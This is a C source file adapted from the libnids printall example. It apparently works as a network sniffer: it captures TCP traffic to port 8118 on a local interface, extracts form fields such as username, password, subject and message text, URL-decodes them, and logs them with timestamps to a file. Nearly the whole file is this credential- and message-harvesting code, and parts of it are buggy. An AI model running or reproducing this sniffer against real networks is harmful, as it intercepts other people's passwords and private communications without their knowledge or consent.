/* http://libnids.sourceforge.net/printall.c */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include "nids.h"
#include <stdlib.h>
#include <time.h>
// #include "urlcode.h"

#define int_ntoa(x) inet_ntoa(*((struct in_addr *)&x))
#define MAX_LEN 4096

char* targetList[] = {
    "text",
    "username",
    "subject",
    "password",
    "from",
    "to=",
    NULL
};

char** StringSplit(char* source, char* targetList[]);
int InString(char* source, char* target);
// char* url_decode(char *str);
void url_decode(char* url);
// char* url_encode(char* str);
// int getLen(char* string);
char from_hex(char ch);
char to_hex(char code);

// char** targetPtr = targetList;

// struct tuple4 contains addresses and port numbers of the TCP connections
// the following auxiliary function produces a string looking like
// 10.0.0.1,1024,10.0.0.2,23
char * adres (struct tuple4 addr)
{
  static char buf[256];
  strcpy (buf, int_ntoa (addr.saddr));
  sprintf (buf + strlen (buf), ",%i,", addr.source);
  strcat (buf, int_ntoa (addr.daddr));
  sprintf (buf + strlen (buf), ",%i", addr.dest);
  return buf;
}

void tcp_callback (struct tcp_stream *a_tcp, void** this_time_not_needed)
// void tcp_callback (struct tcp_stream *a_tcp, void (*)(tcp_stream*, void**) this_time_not_needed)
{
    time_t calendarTime;
    time(&calendarTime);
    struct tm* lt = localtime(&calendarTime);

    char buf[1024];
    strcpy (buf, adres (a_tcp->addr)); // we put conn params into buf
    if (a_tcp->nids_state == NIDS_JUST_EST && a_tcp->addr.dest == 8118 )
    {
    // connection described by a_tcp is established
    // here we decide, if we wish to follow this stream
    // sample condition: if (a_tcp->addr.dest!=23) return;
    // in this simple app we follow each stream, so..
    //   a_tcp->client.collect++; // we want data received by a client
      a_tcp->server.collect++; // and by a server, too
//       a_tcp->server.collect_urg++; // we want urgent data received by a
//                                    // server
// #ifdef WE_WANT_URGENT_DATA_RECEIVED_BY_A_CLIENT
//       a_tcp->client.collect_urg++; // if we don't increase this value,
//                                    // we won't be notified of urgent data
//                                    // arrival
// #endif
        // fprintf (stderr, "%s established\n", buf);
        return;
    }
    if (a_tcp->nids_state == NIDS_CLOSE)
    {
        // connection has been closed normally
        // fprintf (stderr, "%s closing\n", buf);
        return;
    }
    if (a_tcp->nids_state == NIDS_RESET)
    {
        // connection has been closed by RST
        fprintf (stderr, "%s reset\n", buf);
        return;
    }
    if (a_tcp->nids_state == NIDS_DATA)
    {
      // new data has arrived; gotta determine in what direction
      // and if it's urgent or not

        struct half_stream *hlf;
        // if(a_tcp->addr.source == 80)
        // if (a_tcp->server.count_new_urg)
        // {
        //     // new byte of urgent data has arrived 
        //     strcat(buf,"(urgent->)");
        //     buf[strlen(buf)+1]=0;
        //     buf[strlen(buf)]=a_tcp->server.urgdata;
        //     write(1,buf,strlen(buf));
        //     return;
        // }
        // We don't have to check if urgent data to client has arrived,
        // because we haven't increased a_tcp->client.collect_urg variable.
        // So, we have some normal data to take care of.
        // if (a_tcp->client.count_new && a_tcp->addr.source == 8118)
        // {
        //   // new data for the client
        // hlf = &a_tcp->client; // from now on, we will deal with hlf var,
        //                             // which will point to client side of conn
        // strcat (buf, "(<-)"); // symbolic direction of data
        // }
        // else
        if (a_tcp->server.count_new)
        {
            hlf = &a_tcp->server; // analogical
            strcat (buf, "(->)");
        }

        if(InString(hlf->data, "password") || InString(hlf->data, "text=") )
        {
            FILE* log;
            log = fopen("./log.txt", "a");

            char* data = (char*)calloc(hlf->count_new, sizeof(char));
            strncpy(data, hlf->data, hlf->count_new);
            // fprintf(stderr,"%s",buf); // we print the connection parameters
                                // (saddr, daddr, sport, dport) accompanied
                                // by data flow direction (-> or <-)
            printf("%02d-%02d-%02d %02d:%02d:%02d\n", lt->tm_year+1900, lt->tm_mon+1, lt->tm_mday,
                                                    lt->tm_hour, lt->tm_min, lt->tm_sec);
            fprintf(log, "%02d-%02d-%02d %02d:%02d:%02d\n", lt->tm_year+1900, lt->tm_mon+1, lt->tm_mday,
                                                    lt->tm_hour, lt->tm_min, lt->tm_sec);
            char** results = StringSplit(data, targetList);
            for(; *results != NULL; results++)
            {
                char* result = *results;
                printf("\t\t\t%s\n\n", *results);
                // char* decodedURL = url_decode(result, getLen(result));
                url_decode(result);
                // printf("%d\n", strlen(decodedURL));
                // fprintf(log, "\t\t\t%s\n", *results);
                fprintf(log, "\t\t\t%s\n", result);
                // free(decodedURL);
            }
            // free(results);
            // write(2,hlf->data,hlf->count_new); // we print the newly arrived data
            fclose(log);
        }
    }
    return ;
}

char** StringSplit(char* source, char* targetList[])
{
    const char delim[2] = "&";
    char* temp;
    char** results = (char**)malloc(sizeof(char**)*MAX_LEN);    // string array
    char** result = results;    // Save the First Address of results
    temp = strtok(source, delim);
    strcat(temp, "\0");
    int i = 0;
    while (temp != NULL)
    {
        for(char** ptr = targetList; *ptr != NULL; ptr++)
        {
            if(InString(temp, *ptr))
            {
                // *results = temp;
                // *results++;
                results[i] = (char*)malloc(sizeof(char) * strlen(temp));
                results[i] = temp;
                i++;
            }
        }
        temp = strtok(NULL, delim);
        strcat(temp, "\0");
    }
    // *results = NULL;
    results[i] = NULL;
    return result;
}
int InString(char* source, char* target)
{
    int i = 0;
    if(!source || !target)
    {
        printf("Input ERROR!\n");
        return -1;
    }
    while (*(source + i) != '\0')
    {
        int j = 0;
        if(*(source + i) == *(target + j))
        {
            while (*(target + j) != '\0' && *(source + i + j) == *(target + j))
                j++;
            if(*(target + j) == '\0')
                return 1;
        }
        i++;
    }
    return 0;
}

/* Converts a hex character to its integer value */
char from_hex(char ch) {
  return isdigit(ch) ? ch - '0' : tolower(ch) - 'a' + 10;
}

/* Converts an integer value to its hex character*/
char to_hex(char code) {
    static char hex[] = "0123456789abcdef";
    return hex[code & 15];
}

// /* Returns a url-encoded version of str */
// /* IMPORTANT: be sure to free() the returned string after use */
// char *url_encode(char *str) {
//     char *pstr = str, *buf = (char*)malloc(strlen(str) * 3 + 1), *pbuf = buf;
//     while (*pstr) {
//         if (isalnum(*pstr) || *pstr == '-' || *pstr == '_' || *pstr == '.' || *pstr == '~') 
//             *pbuf++ = *pstr;
//         else if (*pstr == ' ') 
//             *pbuf++ = '+';
//         else 
//             *pbuf++ = '%', *pbuf++ = to_hex(*pstr >> 4), *pbuf++ = to_hex(*pstr & 15);
//         pstr++;
//     }
//     *pbuf = '\0';
//     return buf;
// }


void url_decode(char* url)
{
    int i = 0;
    unsigned int len = strlen(url);       // 长度 
    // unsigned int len = getLen(url);
    int res_len = 0;
    unsigned char* res = (unsigned char*)malloc(len+1);        // 动态分配同样的长度 
    for (i = 0; i < len; ++i) 
    {
        char c = url[i];
        if (c != '%') 
        {
            res[res_len++] = c;
        }
        else 
        {
            char c1 = url[++i];
            char c0 = url[++i];
            int num = 0;
            num = from_hex(c1) * 16 + from_hex(c0);
            res[res_len++] = num;
        }
    }
    res[res_len] = '\0';
    strcpy(url, (unsigned char*)res);
    free(res);
}

int main ()
{
  // nids_params.device="en0";
  nids_params.device = "ens33";
  struct nids_chksum_ctl temp;
  temp.netaddr = 0;
  temp.mask = 0;
  temp.action = 1;
  nids_register_chksum_ctl(&temp,1);
  
  // here we can alter libnids params, for instance:
  // nids_params.n_hosts=256;
  if (!nids_init ())
  {
    fprintf(stderr,"%s\n",nids_errbuf);
    exit(1);
  }
  nids_register_tcp (tcp_callback);
  nids_run ();
  return 0;
}